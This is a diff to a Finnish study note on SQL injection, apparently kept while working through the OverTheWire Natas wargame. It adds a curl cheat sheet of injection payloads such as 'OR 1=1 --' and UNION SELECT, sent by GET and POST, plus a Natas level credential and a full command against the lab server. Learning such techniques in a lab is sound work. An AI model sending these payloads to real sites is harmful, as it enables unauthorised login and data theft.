@@ -124,7 +124,7 @@ Mikä tässä voisi paljastaa, että salasana on "s3cr3t"?
 
 ### Etenemisen portaikkoa ja vaiheittain
 
-Periaatteessa alkaa lähtee loogisesti, käytännöllisesti ja portaikkoina niin kokeillee esim. alkuun onko käyttäjätunnus + salasana `admin` . Jos ei ole niin sitten alkaa syöttelee erikoismerkkejä mm. `"` tai `'` , tai molemmat yhdistettynä eli `"'` - huomoithan se on yhteen. 
+Periaatteessa alkaa lähtee loogisesti, käytännöllisesti ja portaikkoina niin kokeillee esim. alkuun onko käyttäjätunnus + salasana `admin` . Jos ei ole niin sitten alkaa syöttelee erikoismerkkejä mm. `"` tai `'` , tai molemmat yhdistettynä eli `"'` - huomoithan se on yhteen. Jos käyttäjä tunnus ei oiskaan admin - voihan kokeillan muita satunnaisia arvoja mm. `test`, `user`, `root`, `1=1` ja `abc'`ja jne. 
 
 Tämä taulukko kuvaa SQL-injektion testauksen ja hyödyntämisen etenemistä vaiheittain. Jokainen vaihe rakentuu edellisen päälle, mahdollistaen syvemmän ymmärryksen ja tehokkaamman testauksen.
 
@@ -185,6 +185,46 @@ ja vastaa tähän SQL muodossa: `SELECT * FROM users WHERE username="admin" OR 1
 --- 
 
 # 🧪 SQL Injection Curl-Komennot – Lunttitaulukko
+
+Tässä taulukossa on eri tapoja käyttää `curl`-komentoa SQL-injektiotestauksessa. Mukana GET- ja POST-esimerkit sekä lomake- ja URL-parametrien käyttö.
+
+| Muoto       | Kuvaus                              | Komento                                                                                             |
+|-------------|--------------------------------------|------------------------------------------------------------------------------------------------------|
+| ✅ GET       | Perus injektio URL-parametrina      | `curl "http://target.site/index.php?username=admin%27%20OR%201%3D1%20--&password=x"`                 |
+| ✅ POST      | Lähettää tiedot lomakekentistä      | `curl -X POST -d "username=admin' OR 1=1 --&password=x" http://target.site/index.php`                |
+| 🔐 HTTP Auth| Peruskirjautuminen (esim. natas)     | `curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 "http://natas14.natas.labs.overthewire.org"`       |
+| 🌐 GET + Auth| GET-injektio autentikoinnilla        | `curl -u user:pass "http://site/index.php?username=admin%27%20OR%201%3D1%20--&password=x"`           |
+| 🧪 POST + Auth| POST-injektio autentikoinnilla       | `curl -u user:pass -X POST -d "username=admin' OR 1=1 --&password=x" http://site/index.php`          |
+| 📝 Enkoodattu| Käyttää URL-enkoodattuja arvoja      | `curl "http://site/index.php?username=admin%22%20OR%201%3D1%20--&password=x"`                        |
+| 🧪 UNION     | UNION SELECT -testi                  | `curl -X POST -d "username=admin' UNION SELECT 1,2 --&password=x" http://target.site/index.php`      |
+
+---
+
+## 📌 Vinkkejä:
+
+- Käytä `--data` tai `-d` POST-pyynnöissä (`application/x-www-form-urlencoded` oletus).
+- Käytä `-u` jos kohde vaatii HTTP basic authentication.
+- Enkoodaa erikoismerkit GET-parametreissa (`'` = `%27`, `"` = `%22`, välilyönti = `%20`).
+- Lisää `?debug=1` tai vastaava jos sivusto tukee virheen tulostamista.
+
+```
+curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
+     -d "username=admin' OR 1=1 --&password=x" \
+     http://natas14.natas.labs.overthewire.org/index.php
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
